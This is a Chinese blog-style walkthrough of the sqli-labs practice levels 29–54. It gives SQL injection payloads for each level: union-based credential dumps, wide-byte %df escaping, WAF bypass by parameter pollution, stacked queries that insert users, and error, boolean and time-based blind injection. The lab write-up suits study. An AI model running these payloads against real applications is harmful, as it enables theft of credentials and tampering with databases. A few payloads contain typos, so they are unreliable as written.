    ?id=1&id=-1' union select 1,2,(select group_concat(username,password) from users)--+
    
        

注意这里的&是在两个id值之间是必不可少的。-
这也是一种用的过waf的技巧。通过构造多个值，来让后面的传入值通过检测。

## less-30

    请求方式 get
    
    闭合方式 '
    
    注入方式 联合，布尔，延时
    
        

payload：-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201218192753863.png)

## Less-31

    和上一关相似，只是闭合方式不同
    
    请求方式 get
    
    闭合方式 ")
    
    注入方式 联合，布尔，延时
    
        

    ?id=1&id=-1") union select 1,2,(select group_concat(username,password) from users)--+
    
        

## Less-32

源码分析

    if(isset($_GET['id'])){
     
    $id=check_addslashes($_GET['id']);
     
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
     
    }
    //在 ' " / 敏感字符前加反斜杠
    function check_addslashes($string){
        $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);        
        $string = preg_replace('/\'/i', '\\\'', $string);                              
        $string = preg_replace('/\"/', "\\\"", $string);
        return $string;
    }
     
    
        

通过分析，我们得知其防御措施是在特殊字符（’ " /） 前加反斜杠，绕过姿势：

宽字节注入，使用%df 吃掉 \\ 或 将 ’ 中的 \\ 过滤掉-
请求方式 get

    闭合方式 '
    
    注入方式 联合，报错，布尔，延时
    
    攻击测试
    
        

> ?id=-1%df’ union select 1,2,(select group\_concat(username,password)-
> from users)–+

### 宽字节注入的原理：

PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。如上图所示%df’被PHP转义，单引号被加上反斜杠\\，变成了%df’，其中\\的十六进制是%5C，那么现在%df’=%d%5C%27,如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK编码时，会认为%df%5C是一个宽字符，也就是縗，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就可以注入了。

\\前面再加一个\\（或单数个），变成\\ \\ ',这样\\被转义了，'逃出了限制。

注：要想防御宽字节注入，在使用 addslashes()时,我们需要将 mysql\_query 设置为 binary 的方式

## less-33

和上一题一个思路-
payload:

    ?id=-1%df' union select 1,2,(select group_concat(username,password)
     from users)--+
    
        

## less-34

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201218224554561.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20201218224608710.png)

## less-35

数字型：

id=0 union select 1,version(),3–+

## less-36

闭合方式：’-
payload：

    ?id=0%df' union select 1,version(),2--+
    
        

## less-37

post-
闭合：’-
payload:

    uname=admin%df' and updatexml(0,concat(0x7e,version()),1)#&passwd=aa&submit=Submit
    
        

## 叠加注入

## less-38

Less-38-
堆叠注入原因：mysqli\_multi\_query 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。

一般

    请求方式 get
    
    闭合方式 '
    
    注入方式 联合，报错，布尔，延时，堆叠
    
    攻击测试 ?id=-1' union select 1,2,version()--+
    
        

我们也可以使用以下payload来创建一个新用户

?id=1’;insert into users(username,password) values (‘good’,‘good’);

可以在数据库中查看。

## Less-39

与38关类似，区别在于闭合方式为 数字型注入

请求方式 get

闭合方式 数字型

注入方式 联合，报错，布尔，延时，堆叠

## Less-40

与38关类似，区别在于闭合方式不同

请求方式 get

闭合方式 ')

注入方式 联合，报错，布尔，延时，堆叠

## Less-41

与39关类似，区别在于没有报错输出，不能使用报错注入

请求方式 get

闭合方式 数字型

注入方式 联合，布尔，延时，堆叠

## less-42

通过测试发现，在password存在注入-
请求方式 post

闭合方式 ’

注入方式 联合，报错，布尔，延时，堆叠

攻击测试

login\_user=admin&login\_password=admin’ and updatexml(0,concat(0x7e,database()),1)#&mysubmit=Login

## Less-43

与42关类似，只是拼接方式不同

请求方式 post

闭合方式 ')

注入方式 联合，报错，布尔，延时，堆叠

## Less-44

与42关类似，只是拼接方式不同，且没有错误消息输出，无法使用报错在注入

请求方式 post

闭合方式 ’

注入方式 联合，布尔，延时，堆叠

## Less-45

与44关类似，只是拼接方式不同

请求方式 post

闭合方式 ')

注入方式 联合，布尔，延时，堆叠

## order by 注入

这之后的几关，使用的SQL语句是：-
select \* from users order by xxx(使用sort传参)-
之前的是：-
select \* from users where id xxx

## Less-46

order by（以什么方式进行排序，by后面接字段数和排序方式）-
asc(升序)desc(降序)-
right(database(),1);取出数据库名称的从右往左的第一个数。-
left同理。-
()lines terminated by() xxx 以xxx 为结尾-
eg：-
order by 6 asc;(取前面六个字段进行升序排列)

与常规的where后的注入不同，order by无法使用union联合查询注入方式

验证-
rand()验证

?sort=rand(1) 与 ?sort=rand(0)的结果时不一致的，利用这一点，我们可以构造布尔盲注和延时注入

延时验证

?sort=1 and sleep(4)

请求方式 get

闭合方式 数字型

注入方式 报错，布尔，延时

报错注入-
利用order by重复键冲突

    ?sort=1 and (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a)
    
        

利用 procedure analyse 参数，也可以执行报错注入

    ?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
    
        

布尔盲注

    ?sort=rand(length(database())=9)
    
        

延时注入

    ?sort=rand(if(length(database())=8,1,sleep(1)))
    
    ?sort=1 and if(length(database())=9,1,sleep(1))
    
        

## Less-47

与46关类似，只是拼接方式不同

请求方式 get

闭合方式 ’

注入方式 报错，布尔，延时

## Less-48

与46关类似，只是少了报错输出，不能使用报错注入

请求方式 get

闭合方式 数字型

注入方式 布尔，延时

## Less-49

与47关类似，只是少了报错输出，不能使用报错注入

请求方式 get

闭合方式 ’

注入方式 布尔，延时

## Less-50

与46关类似，只是询方式由 mysql\_query 变成了 mysqli\_multi\_query，可以使用堆叠注入

请求方式 get

闭合方式 数字型

注入方式 报错，布尔，延时，堆叠

## Less-51

与50关类似，只是拼接方式不同

请求方式 get

闭合方式 ’

注入方式 报错，布尔，延时，堆叠

## Less-52

与50关类似，只是少了报错输出，不能使用报错注入

请求方式 get

闭合方式 数字型

注入方式 布尔，延时，堆叠

## Less-53

与51关类似，只是少了报错输出，不能使用报错注入

请求方式 get

闭合方式 ’

注入方式 布尔，延时，堆叠

## challenge

## less-54

之后的挑战就是找到对应的表中的字段值，拿到key。-
eg：

    ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where column_name=database()--+
    
        

得到表

    ?id=-1' union select 1,2,group_concat(columa_name) from information_schema.columas where column_name='bjtjs3kies'--+
    
        

得到字段

    secret_W6E8 from bjtjs3kies--+
    
        

得到字段值。

后面的挑战就不写了。通过参考了别人的博客，终于是刷到这了。

参考博客：-
[https://blog.csdn.net/weixin\_43252204/article/details/107551358](https://blog.csdn.net/weixin_43252204/article/details/107551358)

[查看原网页: blog.csdn.net](https://blog.csdn.net/qq_45584159/article/details/111054882)



# Quote
